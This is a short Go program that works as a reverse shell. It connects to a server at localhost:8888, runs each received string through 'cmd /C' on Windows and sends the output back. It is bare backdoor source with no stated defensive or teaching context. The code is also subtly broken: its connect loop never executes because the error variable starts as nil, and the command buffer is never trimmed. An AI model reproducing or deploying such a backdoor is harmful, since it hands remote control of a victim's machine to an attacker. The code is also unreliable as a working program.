package main

import (
	"net"
	"os/exec"
)

const HOST = "localhost"
const PORT = "8888"

func main() {
	var conn net.Conn // server connection
	var err error     // server connection error

	// connect to the server until there are no errors
	for err != nil {
		conn, err = net.Dial("tcp", HOST+":"+PORT)
	}

	buff := make([]byte, 1024) // buffer for the server commands

	// start infinite loop
	for {
		// listen for the server commands
		_, err = conn.Read(buff)

		// if there is no error, exec the command
		if err == nil {
			// exec the command
			cmd := exec.Command("cmd", "/C", string(buff))

			// get the command output
			out, err := cmd.Output()

			// if there is an error, send the error message to the server
			if err != nil {
				conn.Write([]byte(err.Error()))
			} else {
				// else, send the output to the server
				conn.Write(out)
			}
		}
	}
}
